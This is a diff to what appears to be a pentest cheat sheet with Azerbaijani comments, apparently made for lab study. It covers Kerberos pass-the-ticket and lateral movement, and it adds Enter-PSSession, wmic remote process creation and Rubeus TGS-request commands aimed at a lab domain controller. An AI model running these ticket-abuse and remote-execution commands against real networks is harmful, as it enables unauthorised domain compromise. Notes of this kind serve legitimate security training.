@@ -37,6 +37,8 @@ kerberos::ptt C:\temp\*.kirbi                 # Bütün ticket-ləri
 Rubeus.exe ptt /ticket:krbtgt.kirbi
 Rubeus.exe ptt /ticket:"C:\Ticket_PAth"
 
+Enter-PSSession -ComputerName DC01.inlanefreight.htb -Authentication Kerberos
+
 ======= Lateral Movement =======================================================================================================================================================================
 
 # PTT aktiv ticket ilə:
@@ -48,6 +50,14 @@ xfreerdp /u:DOMAIN\krbtgt /v:target-host /f
 
 # WMI alternative
 Rubeus.exe ptt /ticket:ticket.kirbi /service:wmi /target:target-host
+klist
+
+# WMIC 
+wmic /node:10.129.204.23 process call create "cmd.exe /c whoami > C:\Windows\Temp\whoami.txt"
+
+# TGS Ticket
+.\Rubeus.exe asktgs /service:cifs/10.129.204.23 /ptt
+
 
 ======= Golden/Silver Ticket Generasiya =======================================================================================================================================================================
 
